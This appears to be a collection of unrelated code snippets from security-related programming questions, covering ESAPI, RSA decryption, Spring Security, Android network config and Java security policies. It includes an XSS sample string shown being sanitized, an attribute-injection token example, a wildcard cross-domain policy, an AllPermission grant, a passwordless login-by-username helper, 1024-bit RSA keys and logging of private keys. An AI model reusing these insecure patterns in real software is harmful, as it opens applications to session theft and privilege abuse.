---UNIQUEIDFORSNIP---|157682251|    /**
     * The reference {@code SecurityConfiguration} manages all the settings used by the ESAPI in a single place. In this reference
     * implementation, resources can be put in several locations, which are searched in the following order:
     * <p>
     * 1) Inside a directory set with a call to SecurityConfiguration.setResourceDirectory( "C:\temp\resources" ).
     * <p>
     * 2) Inside the System.getProperty( "org.owasp.esapi.resources" ) directory.
     * You can set this on the java command line as follows (for example):
     * <pre>
     *              java -Dorg.owasp.esapi.resources="C:\temp\resources"
     * </pre>
     * You may have to add this to the start-up script that starts your web server. For example, for Tomcat,
     * in the "catalina" script that starts Tomcat, you can set the JAVA_OPTS variable to the {@code -D} string above.
     * <p>
     * 3) Inside the {@code System.getProperty( "user.home" ) + "/.esapi"} directory (supported for backward compatibility) or
     * inside the {@code System.getProperty( "user.home" ) + "/esapi"} directory.
     * <p>
     * 4) The first ".esapi" or "esapi" directory on the classpath. (The former for backward compatibility.)
     * <p>
     * Once the Configuration is initialized with a resource directory, you can edit it to set things like master
     * keys and passwords, logging locations, error thresholds, and allowed file extensions.
     * <p>
     * WARNING: Do not forget to update ESAPI.properties to change the master key and other security critical settings.
     *
     * @author Jeff Williams (jeff.williams .at. aspectsecurity.com) <a href="http://www.aspectsecurity.com">Aspect Security</a>
     * @author Jim Manico (jim .at. manico.net) <a href="http://www.manico.net">Manico.net</a>
     * @author Kevin Wall (kevin.w.wall .at. gmail.com)
     */
---UNIQUEIDFORSNIP---|157747597|    $options = array('private_key_bits' => 1024,
                'private_key_type' => OPENSSL_KEYTYPE_RSA,
                'config' => realpath(__DIR__) . '/openssl.cnf');
    
            #Get Client Public Key  
            $keyData = openssl_pkey_get_details($pkGenerate);
            $clientPublicKey = $keyData['key'];
            $this->clientData['clientPublicKeyPEM'] = $keyData['key'];
---UNIQUEIDFORSNIP---|157747599|		 KeyFactory keyFactory=KeyFactory.getInstance("RSA");
		 byte[] pubKeyBits = Base64.decodeBase64(clientPublickeyView.getModulusBytes());
		 PublicKey pubKey=keyFactory.generatePublic(new X509EncodedKeySpec(pubKeyBits));
---UNIQUEIDFORSNIP---|158035187|    int orderId = Integer.parseInt(request.getParameter("orderId"));
    String username = request.getUserPrincipal().getName();
    /*now you need to check if username match with the username of the order e.g. by using hibernate to get the order by id and check its user and if not throw PermissionDeniedException or similiar*/
---UNIQUEIDFORSNIP---|158131418|    C:\Program Files\Java\jre1.8.0_65\lib\security
---UNIQUEIDFORSNIP---|158131422|    C:\Program Files\Java\lib\security
---UNIQUEIDFORSNIP---|158157513|    <?xml version="1.0"?>
    <cross-domain-policy>
       <site-control permitted-cross-domain-policies="master-only"/>
       <allow-http-request-headers-from domain="*" headers="*"/>
       <allow-access-from domain="*" />
    </cross-domain-policy>
---UNIQUEIDFORSNIP---|158213487|    private BigInteger calculateE(BigInteger n, byte[] message)
    {
        /* n is curve order value */
        int log2n = n.bitLength();
        /* and message is a hash */
        int messageBitLength = message.length * 8;
        BigInteger e = new BigInteger(1, message);
        /* If message is longer than curve order */
        if (log2n < messageBitLength)
        {
            /* only log2n bits are taken from the left */
            e = e.shiftRight(messageBitLength - log2n);
        }
        return e;
    }
---UNIQUEIDFORSNIP---|158349670|    ClassLoader classloader = Thread.currentThread().getContextClassLoader();
    InputStream is = classloader.getResourceAsStream("credentials.json");
---UNIQUEIDFORSNIP---|158349673|    InputStream is = AnyClassName.class.getResourceAsStream("credentials.json");
---UNIQUEIDFORSNIP---|158778190|    import java.io.IOException;
    import javax.ws.rs.container.ContainerRequestContext;
    import javax.ws.rs.container.ContainerRequestFilter;
    
    public class Hello implements ContainerRequestFilter {
    
        @Override
        public void filter(ContainerRequestContext requestContext) throws IOException {
            requestContext.getMethod();
            requestContext.getUriInfo().getPath();
            requestContext.getHeaderString("authorization");
        } 
    }
---UNIQUEIDFORSNIP---|158817836|    <session-config>
            <cookie-config>
                <http-only>true</http-only>
            </cookie-config>
        </session-config>
---UNIQUEIDFORSNIP---|158864252|    @Configuration
    @EnableWebSecurity
    public class SecurityConfiguration extends WebSecurityConfigurerAdapter {
        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .anyRequest().fullyAuthenticated()
                    .and()
                    .formLogin().passwordParameter("password");
        }
    
        @Configuration
        protected static class AuthenticationConfiguration extends GlobalAuthenticationConfigurerAdapter {
    
            @Autowired
            LdapContextSource contextSource;
    
            @Override
            public void init(AuthenticationManagerBuilder auth) throws Exception {
                auth
                        .ldapAuthentication()
                        .userDnPatterns("uid={0}")
                        .userSearchFilter("(|(uid={0})(mail={0}))")
                        .contextSource(contextSource);
            }
        }
    }
---UNIQUEIDFORSNIP---|159556007|    public class RMISecurityManager extends SecurityManager {
    
        /**
         * Constructs a new <code>RMISecurityManager</code>.
         * @since JDK1.1
         */
        public RMISecurityManager() {
        }
    }
---UNIQUEIDFORSNIP---|159767325|    <body data-token="@param.token" />
---UNIQUEIDFORSNIP---|159767327|    <body data-token="xyz&quot;" />
---UNIQUEIDFORSNIP---|159767329|    var token = $("body").data("token");
---UNIQUEIDFORSNIP---|159832814|    ((Authentication)principal).getAuthorities();
---UNIQUEIDFORSNIP---|159895094|    String unsafe = "<p><a href='http://example.com/' onclick='stealCookies()'>Link</a></p>";
    String safe = Jsoup.clean(unsafe, Whitelist.basic());
    // now: <p><a href="http://example.com/" rel="nofollow">Link</a></p>
---UNIQUEIDFORSNIP---|160107468|    // Launch the activity to activate encryption.  May or may not return!
    Intent intent = new Intent(DevicePolicyManager.ACTION_START_ENCRYPTION);
    startActivityForResult(intent, REQUEST_CODE_START_ENCRYPTION);
---UNIQUEIDFORSNIP---|160248228|    String -> (Encrypt) -> Encrypted String -> (convert to base64) -> EncryptedBase64EncodedString -> (Decrypt) -> Original String
---UNIQUEIDFORSNIP---|160248231|    EncryptedBase64EncodedString -> (convert from base64 to normal string [Use Default parameters only! No Padding or other constants for decoding base64 string]) -> Pass private_key & decoded string to Cipher -> Profit.
---UNIQUEIDFORSNIP---|160248235|    import org.spongycastle.util.io.pem.PemObject;
    import org.spongycastle.util.io.pem.PemReader;
    
    import android.util.Base64;
    
    import java.io.BufferedReader;
    import java.io.BufferedWriter;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.FileNotFoundException;
    import java.io.FileReader;
    import java.io.FileWriter;
    import java.io.IOException;
    import java.io.InputStreamReader;
    import java.io.StringReader;
    import java.security.GeneralSecurityException;
    import java.security.KeyFactory;
    import java.security.KeyPair;
    import java.security.NoSuchAlgorithmException;
    import java.security.NoSuchProviderException;
    import java.security.PrivateKey;
    import java.security.PublicKey;
    import java.security.Security;
    import java.security.spec.InvalidKeySpecException;
    import java.security.spec.PKCS8EncodedKeySpec;
    import java.security.spec.RSAPrivateCrtKeySpec;
    import java.security.spec.X509EncodedKeySpec;
    
    import javax.crypto.Cipher;
    
    public static void main(String privateKeyPath, String publicKeyPath, String encodedStringPath, boolean isPublicKeyAndDataBase64) throws FileNotFoundException,
                IOException, NoSuchAlgorithmException, NoSuchProviderException {
            Security.addProvider(new BouncyCastleProvider());
    
            String encodedString = readFileAsString(encodedStringPath);
            if(isPublicKeyAndDataBase64) {
                KeyFactory factory = KeyFactory.getInstance("RSA", "BC");
                Timber.w("Encoded String converted from base64: %s", decodeBase64ToBytesa(encodedString));
                try {
                    PrivateKey priv = generatePrivateKey(factory, privateKeyPath);
                    Timber.i(String.format("Instantiated private key: %s", priv));
                    decipherString(priv, decodeBase64ToBytesa(encodedString));
                } catch (InvalidKeySpecException e) {
                    e.printStackTrace();
                }
                return;
            }
            else
                Timber.w("Encoded String: %s", encodedString);
    
            KeyFactory factory = KeyFactory.getInstance("RSA", "BC");
            try {
                PrivateKey priv = generatePrivateKey(factory, privateKeyPath);
                Timber.i(String.format("Instantiated private key: %s", priv));
                decipherString(priv, encodedString.getBytes());
                PublicKey pub = generatePublicKey(factory, publicKeyPath);
                Timber.i(String.format("Instantiated public key: %s", pub));
            } catch (InvalidKeySpecException e) {
                e.printStackTrace();
            }
        }
    
        private static PrivateKey generatePrivateKey(KeyFactory factory,
                                                     String filename) throws InvalidKeySpecException,
                FileNotFoundException, IOException {
            PemFile pemFile = new PemFile(filename, false);
            byte[] content = pemFile.getPemObject().getContent();
            PKCS8EncodedKeySpec privKeySpec = new PKCS8EncodedKeySpec(content);
            return factory.generatePrivate(privKeySpec);
        }
    
        private static PublicKey generatePublicKey(KeyFactory factory,
                                                   String filename) throws InvalidKeySpecException,
                FileNotFoundException, IOException {
            PemFile pemFile = new PemFile(filename, false);
            byte[] content = pemFile.getPemObject().getContent();
            X509EncodedKeySpec pubKeySpec = new X509EncodedKeySpec(content);
            return factory.generatePublic(pubKeySpec);
        }
    
        private static void decipherString(PrivateKey privateKey, byte[] encodedStringData) {
            byte[] dectyptedText = null;
            try {
                Cipher cipher = Cipher.getInstance("RSA");
                cipher.init(Cipher.DECRYPT_MODE, privateKey);
                dectyptedText = cipher.doFinal(encodedStringData);
                Timber.w("Deciphered text is: %s", new String(dectyptedText));
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
        static class PemFile {
    
            private PemObject pemObject;
    
            public PemFile(String filename, boolean isBase64) throws FileNotFoundException, IOException {
                PemReader pemReader = null;
    
                if(isBase64) {
                    Timber.i("reading base64 encoded pem file. base64DecodedString: %s", decodeBase64(filename));
                    pemReader = new PemReader(new StringReader(decodeBase64(filename)));
                }
                else
                    pemReader = new PemReader(new InputStreamReader(
                            new FileInputStream(filename)));
                try {
                    this.pemObject = pemReader.readPemObject();
                }
                catch (Exception e) {
                    e.printStackTrace();
                }finally {
                    pemReader.close();
                }
            }
    
            public PemObject getPemObject() {
                return pemObject;
            }
        }
---UNIQUEIDFORSNIP---|160262701|    <?xml version="1.0" encoding="utf-8"?>
    <network-security-config>
        <domain-config cleartextTrafficPermitted="false">
            <domain includeSubdomains="true">secure.example.com</domain>
        </domain-config>
    </network-security-config>
---UNIQUEIDFORSNIP---|160262703|    <network-security-config>
        <base-config cleartextTrafficPermitted="false">
            <trust-anchors>
                <certificates src="system" />
            </trust-anchors>
        </base-config>
    </network-security-config>
---UNIQUEIDFORSNIP---|160292884|    SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
    Schema myschema = factory.newSchema();
    Validator validator = myschema.newValidator();
    try {
      validator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
      validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
      validator.validate(new StreamSource(new StringReader(xmlString)));
    } catch ...
---UNIQUEIDFORSNIP---|160467430|    @Override
    public void configure(WebSecurity webSecurity) {
      webSecurity.ignoring().antMatchers(HttpMethod.POST, "/v2/session");
    }
---UNIQUEIDFORSNIP---|160468637|java -Djava.security.manager Main 
---UNIQUEIDFORSNIP---|160468639|java -Djava.security.manager -Djava.security.policy==security.policy Main
---UNIQUEIDFORSNIP---|160468641|java -Djava.security.manager -Djava.security.policy=security.policy Main
---UNIQUEIDFORSNIP---|160572073|    byte[] data = hexStringToByteArray(hexData);
    MessageDigest md = MessageDigest.getInstance("SHA-1");
    md.update(data, 0, data.length);
    byte[] sha1hash = md.digest();
---UNIQUEIDFORSNIP---|160915104|    <authentication-manager>
    <authentication-provider>
    <jdbc-user-service id="jdbcUserService" data-source-ref="dataSource"
      users-by-username-query="select username,password, enabled from users where username=?" 
      authorities-by-username-query="select u.username, ur.authority from users u, user_roles ur where u.user_id = ur.user_id and u.username =?  " 
    />
    </authentication-provider>
    </authentication-manager>
---UNIQUEIDFORSNIP---|160915108|    @Autowired
    @Qualifier("jdbcUserService")  // <-- this references the bean id
    public UserDetailsManager userDetailsManager;
---UNIQUEIDFORSNIP---|160915111|    @RequestMapping("/automatic/login/test")
    public @ResponseBody String automaticLoginTest(HttpServletRequest request) 
    {
        String username = "anyUserName@YourSite.com";
    
        Boolean result = authenticateUserAndInitializeSessionByUsername(username, userDetailsManager, request);
    
        return result.toString();
    }
    
    public boolean authenticateUserAndInitializeSessionByUsername(String username, UserDetailsManager userDetailsManager, HttpServletRequest request)
    {
        boolean result = true;
    
        try
        {
            // generate session if one doesn't exist
            request.getSession();
    
            // Authenticate the user
            UserDetails user = userDetailsManager.loadUserByUsername(username);
            Authentication auth = new UsernamePasswordAuthenticationToken(user, null, user.getAuthorities());
            SecurityContextHolder.getContext().setAuthentication(auth);
        }
        catch (Exception e)
        {
          System.out.println(e.getMessage());
          
          result = false;
        }
    
        return result;
    }
---UNIQUEIDFORSNIP---|160921517|    StringBuilder sb = new StringBuilder("Mat");
    sb.append(" ");
    sb.append("Bank");
    // oops
    int i = sb.indexOf("k");
    sb.insert(i, 'i'); // character
    String mb = sb.toString();
    // result = "Mat Banik"
---UNIQUEIDFORSNIP---|161151166|    HttpServletResponse hsr = (HttpServletResponse) response;
    hsr.setHeader("Cache-Control", "no-cache, no-store, must-revalidate"); // HTTP 1.1.
    hsr.setHeader("Pragma", "no-cache"); // HTTP 1.0.
    hsr.setDateHeader("Expires", 0); // Proxies.
    chain.doFilter(request, response);
---UNIQUEIDFORSNIP---|161263126|    public class LaunchMenu extends Applet {
    	
    	public static LoginScreen login;
    	public static Game game;
    	public JButton button;
    	public void init() {
    		try {button= new JButton("Start the game");
    		add(button);
    		
    		button.addActionListener(new ActionListener() {
    			public void actionPerformed(ActionEvent arg0) {
    				login = new LoginScreen();
    				login.setVisible(true); *
    				
    			}
    		});
    		} catch (Exception e) {
    			e.getMessage();
    			e.getCause();
    		}
    	}
    	
    	public void start() {
    		login = new LoginScreen();
    	}
    
    	public void stop() {
    		login.dispose();
    		game.stop();
    	}
    	
    	public static void main(String[] args) {
    		
    	}
    }
---UNIQUEIDFORSNIP---|161263130|    grant { 
          permission java.security.AllPermission; 
    }; 
---UNIQUEIDFORSNIP---|161267099|<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ReflectionFactory.java#72">72</a>  <font color="#7f0055"><b>private</b></font> <font color="#7f0055"><b>static</b></font> <font color="#7f0055"><b>int</b></font>     inflationThreshold = 15;<br/>
---UNIQUEIDFORSNIP---|161267101|<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#47">47</a>  <font color="#7f0055"><b>if</b></font> (++<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0numInvocations" title="int numInvocations" class="hidden">numInvocations</a> > ReflectionFactory.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ReflectionFactory.java#ReflectionFactory.inflationThreshold%28%29" title="sun.reflect.ReflectionFactory.inflationThreshold() : int">inflationThreshold</a>()) {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#48">48</a>      <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ConstructorAccessorImpl.java#ConstructorAccessorImpl" title="sun.reflect.ConstructorAccessorImpl">ConstructorAccessorImpl</a> acc = (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ConstructorAccessorImpl.java#ConstructorAccessorImpl" title="sun.reflect.ConstructorAccessorImpl">ConstructorAccessorImpl</a>)<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#49">49</a>          <font color="#7f0055"><b>new</b></font> <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#MethodAccessorGenerator" title="sun.reflect.MethodAccessorGenerator">MethodAccessorGenerator</a>().<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#50">50</a>              <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#MethodAccessorGenerator.generateConstructor%28java.lang.Class%2Cjava.lang.Class%5B%5D%2Cjava.lang.Class%5B%5D%2Cint%29" title="sun.reflect.MethodAccessorGenerator.generateConstructor(java.lang.Class,java.lang.Class[],java.lang.Class[],int) : ConstructorAccessor">generateConstructor</a>(<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0c" title="Constructor c" class="hidden">c</a>.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/reflect/Constructor.java#Constructor.getDeclaringClass%28%29" title="java.lang.reflect.Constructor.getDeclaringClass() : Class">getDeclaringClass</a>(),<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#51">51</a>                                  <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0c" title="Constructor c" class="hidden">c</a>.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/reflect/Constructor.java#Constructor.getParameterTypes%28%29" title="java.lang.reflect.Constructor.getParameterTypes() : Class[]">getParameterTypes</a>(),<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#52">52</a>                                  <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0c" title="Constructor c" class="hidden">c</a>.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/reflect/Constructor.java#Constructor.getExceptionTypes%28%29" title="java.lang.reflect.Constructor.getExceptionTypes() : Class[]">getExceptionTypes</a>(),<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#53">53</a>                                  <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0c" title="Constructor c" class="hidden">c</a>.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/reflect/Constructor.java#Constructor.getModifiers%28%29" title="java.lang.reflect.Constructor.getModifiers() : int">getModifiers</a>());<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#54">54</a>      <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/NativeConstructorAccessorImpl.java#NativeConstructorAccessorImpl.0parent" title="DelegatingConstructorAccessorImpl parent" class="hidden">parent</a>.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/DelegatingConstructorAccessorImpl.java#DelegatingConstructorAccessorImpl.setDelegate%28sun.reflect.ConstructorAccessorImpl%29" title="sun.reflect.DelegatingConstructorAccessorImpl.setDelegate(sun.reflect.ConstructorAccessorImpl) : void">setDelegate</a>(acc);<br/>
---UNIQUEIDFORSNIP---|161267103|<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#387">387</a>  <font color="#676767">// Load class</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#388">388</a>  vec.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ByteVector.java#ByteVector.trim%28%29" title="sun.reflect.ByteVector.trim() : void">trim</a>();<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#389">389</a>  <font color="#7f0055"><b>final</b></font> <font color="#7f0055"><b>byte</b></font>[] bytes = vec.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ByteVector.java#ByteVector.getData%28%29" title="sun.reflect.ByteVector.getData() : byte[]">getData</a>();<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#390">390</a>  <font color="#676767">// Note: the class loader is the only thing that really matters</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#391">391</a>  <font color="#676767">// here -- it's important to get the generated code into the</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#392">392</a>  <font color="#676767">// same namespace as the target class. Since the generated code</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#393">393</a>  <font color="#676767">// is privileged anyway, the protection domain probably doesn't</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#394">394</a>  <font color="#676767">// matter.</font><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#395">395</a>  <font color="#7f0055"><b>return</b></font> AccessController.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/security/AccessController.java#AccessController.doPrivileged%28java.security.PrivilegedAction%29" title="java.security.AccessController.doPrivileged(java.security.PrivilegedAction) : MagicAccessorImpl">doPrivileged</a>(<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#396">396</a>      <font color="#7f0055"><b>new</b></font> <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/security/PrivilegedAction.java#PrivilegedAction" title="java.security.PrivilegedAction">PrivilegedAction</a>&lt;<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MagicAccessorImpl.java#MagicAccessorImpl" title="sun.reflect.MagicAccessorImpl">MagicAccessorImpl</a>>() {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#397">397</a>          <font color="#7f0055"><b>public</b></font> <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MagicAccessorImpl.java#MagicAccessorImpl" title="sun.reflect.MagicAccessorImpl">MagicAccessorImpl</a> run() {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#398">398</a>                  <font color="#7f0055"><b>try</b></font> {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#399">399</a>                  <font color="#7f0055"><b>return</b></font> (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MagicAccessorImpl.java#MagicAccessorImpl" title="sun.reflect.MagicAccessorImpl">MagicAccessorImpl</a>)<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#400">400</a>                  ClassDefiner.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/ClassDefiner.java#ClassDefiner.defineClass%28java.lang.String%2Cbyte%5B%5D%2Cint%2Cint%2Cjava.lang.ClassLoader%29" title="sun.reflect.ClassDefiner.defineClass(java.lang.String,byte[],int,int,java.lang.ClassLoader) : Class">defineClass</a><br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#401">401</a>                          (generatedName,<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#402">402</a>                           bytes,<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#403">403</a>                           0,<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#404">404</a>                           bytes.length,<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#405">405</a>                           declaringClass.<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/Class.java#Class.getClassLoader%28%29" title="java.lang.Class.getClassLoader() : ClassLoader">getClassLoader</a>()).<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/Class.java#Class.newInstance%28%29" title="java.lang.Class.newInstance() : Object">newInstance</a>();<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#406">406</a>                  } <font color="#7f0055"><b>catch</b></font> (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/InstantiationException.java#InstantiationException" title="java.lang.InstantiationException">InstantiationException</a> e) {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#407">407</a>                      <font color="#7f0055"><b>throw</b></font> (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/InternalError.java#InternalError" title="java.lang.InternalError">InternalError</a>)<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#408">408</a>                          <font color="#7f0055"><b>new</b></font> <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/InternalError.java#InternalError" title="java.lang.InternalError">InternalError</a>().<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/Throwable.java#Throwable.initCause%28java.lang.Throwable%29" title="java.lang.Throwable.initCause(java.lang.Throwable) : Throwable">initCause</a>(e);<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#409">409</a>                  } <font color="#7f0055"><b>catch</b></font> (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/IllegalAccessException.java#IllegalAccessException" title="java.lang.IllegalAccessException">IllegalAccessException</a> e) {<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#410">410</a>                      <font color="#7f0055"><b>throw</b></font> (<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/InternalError.java#InternalError" title="java.lang.InternalError">InternalError</a>)<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#411">411</a>                          <font color="#7f0055"><b>new</b></font> <a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/InternalError.java#InternalError" title="java.lang.InternalError">InternalError</a>().<a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/lang/Throwable.java#Throwable.initCause%28java.lang.Throwable%29" title="java.lang.Throwable.initCause(java.lang.Throwable) : Throwable">initCause</a>(e);<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#412">412</a>                  }<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#413">413</a>              }<br/><a href="http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/sun/reflect/MethodAccessorGenerator.java#414">414</a>          });<br/>
---UNIQUEIDFORSNIP---|161325543|    at java.security.AccessControlContext.checkPermission(AccessControlContext.java:372)
    at java.security.AccessController.checkPermission(AccessController.java:559)
    at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
    at Main$1.checkPermission(Main.java:51)
    at java.lang.SecurityManager.checkCreateClassLoader(SecurityManager.java:611)
    at java.lang.ClassLoader.checkCreateClassLoader(ClassLoader.java:274)
    at java.lang.ClassLoader.<init>(ClassLoader.java:316)
    at sun.reflect.DelegatingClassLoader.<init>(ClassDefiner.java:72)
    at sun.reflect.ClassDefiner$1.run(ClassDefiner.java:60)
    at sun.reflect.ClassDefiner$1.run(ClassDefiner.java:58)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.reflect.ClassDefiner.defineClass(ClassDefiner.java:57)
---UNIQUEIDFORSNIP---|161538772|    KeyPair pair = generateKeyPair();
    PKCS10CertificationRequestBuilder p10Builder = new JcaPKCS10CertificationRequestBuilder(
        new X500Principal("CN=Requested Test Certificate"), pair.getPublic());
    JcaContentSignerBuilder csBuilder = new JcaContentSignerBuilder("SHA256withRSA");
    ContentSigner signer = csBuilder.build(pair.getPrivate());
    PKCS10CertificationRequest csr = p10Builder.build(signer);
---UNIQUEIDFORSNIP---|161653604|    String digest = digester.digest(clave);
    //Always fails at that point, I get different hash from compare clave
    return digester.matches(digest, hash);
---UNIQUEIDFORSNIP---|161653606|    digester.matches(clave, hash);
---UNIQUEIDFORSNIP---|161752590|    request.foo = url.foo;
